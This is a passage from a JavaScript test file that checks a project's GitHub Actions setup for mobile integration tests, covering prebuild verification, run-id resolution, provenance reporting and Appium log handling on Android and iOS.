  assert.equal(run.status, 0, run.output)
  // The run id and head SHA land next to the file list, so the log shows what
  // was installed without cross-referencing an earlier step.
  assert.match(run.output, /run 33179656677/)
  assert.match(run.output, /deadbeefcafe/)
})

test('a bundle missing this platform fails instead of building around a gap', () => {
  // The exact shape of a prebuild run whose iOS leg was cancelled.
  const run = runVerify({ dirs: ['android-arm64'], expected: 'ios-arm64', platform: 'iOS' })

  assert.notEqual(run.status, 0, run.output)
  assert.match(run.output, /::error::/)
  assert.match(run.output, /cannot build for iOS/)
  // Naming what IS there is what turns this into a one-look diagnosis.
  assert.match(run.output, /android-arm64/)
})

test('an empty platform dir counts as missing, not present', () => {
  const directory = mkdtempSync(join(tmpdir(), 'qvac-prebuild-run-verify-'))
  mkdirSync(join(directory, 'prebuilds/android-arm64'), { recursive: true })

  const result = spawnSync(
    'bash',
    ['--noprofile', '--norc', '-e', '-o', 'pipefail', '-c', verifyScript],
    {
      cwd: directory,
      encoding: 'utf8',
      env: {
        ...process.env,
        EXPECTED_DIRS: 'android-arm64',
        SOURCE_RUN_ID: '1',
        SOURCE_HEAD_SHA: 'abc',
        SOURCE_ARTIFACT: 'prebuilds-llm-llamacpp',
        PLATFORM: 'Android',
      },
    },
  )

  rmSync(directory, { recursive: true, force: true })
  assert.notEqual(result.status, 0, `${result.stdout}${result.stderr}`)
})

// download-artifact overwrites the files it carries and leaves the rest, so a
// committed prebuilds/ dir or a leftover from an earlier job on the same
// self-hosted runner could survive and be linked into the app.
test('the run-id path clears prebuilds/ so nothing can shadow the resolved run', () => {
  const source = read(ACTION)
  const resolveStep = source.slice(
    source.indexOf('name: Resolve prebuilds from a run id'),
    source.indexOf('name: Download prebuilds (from the resolved run)'),
  )

  assert.match(
    resolveStep,
    /rm -rf "addon\/\$ADDON_WORKDIR\/prebuilds"/,
    'the resolve step must clear prebuilds/ before the artifact is extracted',
  )
  // Ordering matters: clearing before a failed resolve would delete the tree
  // for a run that is about to be rejected anyway, and `-e` makes the node
  // invocation the gate.
  assert.ok(
    resolveStep.indexOf('resolve-prebuild-run.mjs') < resolveStep.indexOf('rm -rf'),
    'the clear must happen only after resolution succeeds',
  )
})

// The repo is fork-first, so a fork-built source run is the normal case and must
// not be refused — what matters is that the dispatcher can see it. Behaviour
// lives in the resolver's unit tests; this pins the surfacing.
test('the resolver reports which repository built the prebuilds', () => {
  const resolver = read(
    '.github/actions/run-mobile-integration-tests/setup/resolve-prebuild-run.mjs',
  )

  assert.match(
    resolver,
    /export function sourceRepositoryWarning/,
    'the check must stay a named, separately testable function',
  )
  // The provenance line itself must carry the head repository, so the fact is
  // present even when no warning fires.
  const provenance = resolver.slice(
    resolver.indexOf('export function formatProvenance'),
    resolver.indexOf('export function conclusionWarning'),
  )
  assert.match(
    provenance,
    /head_repository/,
    'the provenance line must name the repository the binaries were built from',
  )
  // Fork-built runs are the documented norm here, so this must not hard-fail.
  assert.ok(
    !/throw new ResolveError\(`Refusing prebuilds/.test(resolver),
    'a fork-built run must warn, not be refused — this repo is fork-first',
  )
})

// audiogen-ggml pins its composite actions to the DEFAULT BRANCH as a
// supply-chain guard, so it runs main's setup action rather than the PR's. An
// older copy has no `prebuild-run-id` input, and GitHub only WARNS on an unknown
// input — observed live: the run logged "Unexpected input(s) 'prebuild-run-id'"
// and then "downloading @qvac/audiogen-ggml@latest from npm", i.e. it silently
// tested the published release. That is the failure this route exists to remove,
// so the workflow must assert the input was honoured.
test('a workflow pinning the composite to the default branch asserts the run id took effect', () => {
  const workflows = spawnSync(
    'git',
    ['ls-files', '.github/workflows/integration-mobile-test-*.yml'],
    { cwd: root, encoding: 'utf8' },
  ).stdout.trim().split('\n').filter(Boolean)

  const offenders = []
  for (const relativePath of workflows) {
    const source = read(relativePath)
    if (!source.includes('prebuild-run-id:')) continue

    // Does this workflow load the setup composite from the default branch?
    const pinned = /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/.test(source)
    if (!pinned) continue

    const asserts =
      source.includes('steps.setup.outputs.prebuild-source-run-id') &&
      // always(): when the input is ignored, setup fails first, so a plain
      // conditional would skip the step that explains why.
      /if: always\(\) && inputs\.prebuild_run_id != ''/.test(source)
    if (!asserts) offenders.push(relativePath)
  }

  assert.deepEqual(
    offenders,
    [],
    'a default-branch-pinned workflow silently ignores prebuild-run-id until the action is on main,\n' +
      'so it must assert steps.setup.outputs.prebuild-source-run-id matches the request:\n' +
      offenders.join('\n'),
  )
})

// The assertion above is only possible because the composite exposes what it
// actually used.
test('the setup action exposes the run id it installed from', () => {
  const action = read(ACTION)
  assert.match(action, /^outputs:$/m, 'the action must declare outputs')
  assert.match(
    action,
    /prebuild-source-run-id:[\s\S]*?value: \$\{\{ steps\.prebuild_run\.outputs\.source_run_id \}\}/,
    'prebuild-source-run-id must surface the resolver output',
  )
})

// Appium's pull_file returns `value` as a base64 string on success and as an
// error object on failure. Handing the object to Buffer.from threw "The first
// argument must be of type string...", which replaced Appium's real reason —
// observed on every Android Device Farm run, pass or fail, while iOS logged
// "flush ok". The app-side log is the only place a failing runner says why it
// failed, so masking that error makes every Android failure untriageable.
test('the bare-log flush reports Appium\'s real error, not a type error', () => {
  const template = read(
    '.github/actions/run-mobile-integration-tests/upload-to-devicefarm/wdio.template.js',
  )
  const flush = template.slice(
    template.indexOf('global.flushBareLog'),
    template.indexOf('global.isAndroid'),
  )

  assert.match(
    flush,
    /typeof b64 !== 'string'/,
    'the payload must be type-checked before Buffer.from',
  )
  assert.match(
    flush,
    /pull_file returned no base64 payload/,
    'the thrown message must name the real failure',
  )
  // The guard has to come first, or Buffer.from still throws the type error.
  assert.ok(
    flush.indexOf("typeof b64 !== 'string'") < flush.indexOf("Buffer.from(b64"),
    'the type check must precede the Buffer.from it protects',
  )
})

// iOS reads the app-side log fine. Android cannot with the Device Farm artifact:
// adb hits "Permission denied" on the app's private data dir and run-as is
// refused with "package not debuggable" on a release-signed APK — both observed
// on real runs. So Android tries only the world-readable external path and
// otherwise states plainly that the log is unavailable, rather than burning
// several doomed pulls per run and reporting a confusing error.
test('the bare-log pull is platform-appropriate and explains the Android gap', () => {
  const template = read(
    '.github/actions/run-mobile-integration-tests/upload-to-devicefarm/wdio.template.js',
  )

  assert.match(template, /global\.bareLogCandidates = function \(isAndroid, bundleId\)/)
  // iOS keeps the container form that works.
  assert.match(template, /return \['@' \+ bundleId \+ ':documents\/bare_console\.log'\]/)
  // Android: exactly one candidate, the adb-readable external path.
  assert.match(template, /return \['\/sdcard\/Android\/data\/' \+ bundleId \+ '\/files\/bare_console\.log'\]/)
  // No run-as: it cannot work on a release-signed APK.
  assert.doesNotMatch(template, /command: 'run-as'/)
  // The Android branch must say why, and point at where the output actually is:
  // the bare runtime logs to logcat, so logcat_full.txt carries the reason.
  assert.match(template, /no bare_console\.log on Android/)
  // Match on facts, not on how the comment happens to wrap.
  assert.match(template, /release-signed APK/)
  assert.match(template, /logcat_full\.txt under the `bare` tag/)
})
